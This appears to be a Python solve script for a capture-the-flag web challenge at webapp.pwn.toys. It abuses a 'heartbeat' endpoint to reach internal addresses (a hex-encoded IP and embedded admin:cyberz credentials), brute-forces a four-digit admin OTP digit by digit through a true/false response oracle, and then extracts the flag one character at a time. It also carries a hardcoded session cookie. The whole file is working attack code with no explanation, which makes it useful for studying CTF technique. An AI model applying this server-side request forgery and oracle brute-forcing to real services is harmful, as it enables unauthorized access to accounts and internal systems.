import requests
import string
import time

s = requests.Session()

auth_cookie = {'ept': 'b4bd573ce66d18ee','session': '.eJw9zjEOwjAMAMC_ZGZI3Dix-5nKjm1RiXZoxYT4O0VIrDfdKy1x-HlPc8jj9FtaVktziqpYTTMRYs2m2rkxI4yQUM7ITYsCK1jTplRKwWKsk9eRhdpwqMrCPqgBuIHxkK4T9ypBA5yiowoEctXIvU9CQSBigBxElq7I8_TjtxHb1v2ir-yy-Z_eH98KOJs.ZCXasg.y-48zlt664yUo74XnWJwWN71XEE'}

def get_otp():
    otp = ""
    for _ in range(4):
        for i in range(10):
            res = s.post(f"https://webapp.pwn.toys/heartbeat?endpoint=0x0A64D5AD/otp/admin&response={otp + str(i)}", cookies=auth_cookie)
            if "true" in res.text:
                otp += str(i)
                break
    print(otp)
    return otp

def validate_otp(otp):
    res = s.post(f"https://webapp.pwn.toys/heartbeat?endpoint=0x0A64D5AD/otp/admin&response={otp}", cookies=auth_cookie)
    if "true" in res.text:
        return True
    else: 
        return False

valid = "_" + string.ascii_letters + string.digits
valid = list(valid)
valid.append("%7B")
valid.append("%7D")
hex_chars = ["A","B", "C", "D", "E", "F"]

for i in range(2,4):
    for k in range(10):
        valid.append(f"%{i}{k}")
    for k in hex_chars:
        valid.append(f"%{i}{k}")
valid.append("%40")

print(valid)

flag = ""

otp = get_otp()
while True:
    print("new letter")
    for c in valid:
        if not validate_otp(otp):
            otp = get_otp()
        res = s.post(f"https://webapp.pwn.toys/heartbeat?endpoint=admin:cyberz@0x0A64D5AD/flag/{otp}&response={flag+c}", cookies=auth_cookie)
        if "true" in res.text:
            flag += c
            print(flag)
            break




